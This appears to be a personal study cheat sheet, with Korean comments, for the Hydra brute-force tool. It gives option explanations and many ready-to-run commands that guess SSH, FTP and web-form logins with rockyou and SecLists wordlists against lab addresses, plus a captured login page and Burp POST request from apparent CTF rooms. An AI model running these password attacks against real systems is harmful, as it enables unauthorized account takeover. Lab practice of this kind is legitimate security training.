# hydra

```bash
hydra -l <username> -P <full path to pass> 10.201.20.141 -t 4 ssh

# 주요 옵션
# -l : 단일 사용자명
# -L : 사용자명 리스트
# -P : 패스워드 리스트
# -s : 포트 지정
# -V : 시도하는 계정/패스워드 실시간 출력
# -t : 동시 스레드 수 (기본 16)
# -f : 첫 성공시 멈춤

# 설치 (kali는 기본 설치)
sudo apt update && sudo apt install -y hydra

# 안전하게 -t 4
hydra -l root -P passwords.txt 10.201.20.141 -t 4 ssh
hydra -l <username> -P <full path to pass> 10.201.106.187 -t 4 ssh

sudo hydra <username> <wordlist> 10.201.20.141 http-post-form "<path>:<login_credentials>:<invalid_response>"
# ssh brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -l <username> -P <wordlist> 10.201.20.141 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
# ftp brute force
hydra -l anonymous -P pass.txt ftp://10.10.10.10

# http-post-form (로그인 폼)
hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
hydra -l think -P password.txt ssh://10.10.67.138 --t 40 -v
hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"

# 결과 예시
# [22][ssh] host: 10.10.10.10 login: root password: 123456
```



<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
</head>
<body>

  <div class="container">
  </br><img width="300" src="assets/portal.jpg"><h3>Portal Login Page</h3></br>
    <form name="input" action="" method="post">
      <label for="username">Username:</label><input type="text" class="form-control" value="" id="username" name="username" />
      <label for="password">Password:</label><input type="password" class="form-control" value="" id="password" name="password" />

      
    </br><input type="submit" value="Login" class="btn btn-success" name="sub"/>
    </form>
  </div>

</body>
</html>



sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed"


- burpsuite form

POST /login/index.php HTTP/1.1
Host: 192.168.110.101
Content-Length: 51
Cache-Control: max-age=0
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://192.168.110.101
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.110.101/login/
Accept-Encoding: gzip, deflate, br
Cookie: ISPCSESS=n5g33db3sjduau5fkoocckdvss
Connection: keep-alive

username=test&password=test2&s_mod=login&s_pg=index


```bash
hydra -L /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt 192.168.110.101 http-post-form "/login/index.php:username=^USER^&password=^PASS^:F=로그인실패문구"
```